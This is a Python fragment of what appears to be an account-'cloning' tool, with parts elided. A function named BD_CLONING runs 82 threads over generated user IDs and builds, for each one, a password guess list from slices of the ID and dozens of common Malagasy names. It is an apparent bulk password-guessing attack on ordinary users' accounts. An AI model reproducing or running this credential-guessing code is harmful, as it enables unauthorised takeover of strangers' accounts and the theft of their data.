...
def BD_CLONING():
    ...
    with tred(max_workers=82) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'nomena','Nomena','lafatra','fahendrena','Fahendrena','fandresena','Fandresena','nantenaina','stephane','fandrosoana','Fandrosoana','tanindrazana','Tanindrazana','miranto','Miranto','Stephane','nandrianina','Nandrianina','Stéphanie','stéphanie','rakotomalala','Rakotomalala','tanjona','Tanjona','solofo','Solofo','Nantenaina','nilaina','Nilaina','nirina','Nirina','Narindra','Rakoto','fitahiana','Fitahiana','diamondra','Diamondra','faniry','Faniry','rakoto','hasina','Hasina','tsilavina','Tsilavina','finaritra','Finaritra','fanomezana','Fanomezana','Sarindra','sarindra','nambinina','Nambinina','Sitraka','sitraka','mamitiana','Mamitiana','vololona','Vololona','mamisoa','Mamisoa','fanomezantsoa','Fanomezantsoa','fanantenana','Fanantenana','narindra','Narindra','Lalatiana','lalatiana','sarobidy','Sarobidy','lalaina','narovana','Narovana','Lalaina', 'mendrika','henintsoa','Henintsoa','mahery','Mahery','jessica','mandresy','Mandresy']
